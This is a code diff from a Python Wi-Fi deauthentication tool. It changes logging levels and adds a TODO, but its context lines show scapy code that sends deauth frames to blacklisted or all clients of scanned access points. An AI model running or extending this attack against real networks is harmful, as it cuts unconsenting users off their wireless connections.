@@ -128,7 +128,7 @@ def send_deauth_packets(interface: str, target: str, bssid: str, reasons: List[i
         for reason in reasons:
             packet = create_deauth_packet(src=target, dst=bssid, bssid=bssid, reason=reason)
             sendp(packet, iface=interface, count=seq, inter=0.1, verbose=0)
-            logger.info(f"Sent deauth packets to {target} from BSSID {bssid} with reason {reason}")
+            logger.debug(f"Sent deauth packets to {target} from BSSID {bssid} with reason {reason}")
     except Exception as e:
         logger.error(f"Error while sending deauth packets: {e}")
 
@@ -151,7 +151,7 @@ def deauth_process() -> None:
             with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                 future_scan = executor.submit(scan_networks, INTERFACE_MONITOR_1)
                 
-                while (time.time() - start_time) < args.channel_wait:
+                while (time.time() - start_time) < args.channel_wait: # TODO May be this should be replaced with repeat_times
                     if future_scan.done():
                         try:
                             ap_list, client_list = future_scan.result()
@@ -169,7 +169,7 @@ def deauth_process() -> None:
                                             logger.info(f"Client:{client} is in whitelist")
                                             continue
                                         if args.attack_all_client or client in args.blacklist_client:
-                                            logger.info(f"Deauthing client {client} from BSSID {bssid} (SSID: {ssid})")
+                                            logger.warning(f"Deauthing client {client} from BSSID {bssid} (SSID: {ssid})")
                                             executor.submit(send_deauth_packets, INTERFACE_MONITOR_2, target=client, bssid=bssid, reasons=args.deauth_reasons, seq=args.deauth_seq)
 
                             future_scan = executor.submit(scan_networks, INTERFACE_MONITOR_1)  # Resubmit the scanning task
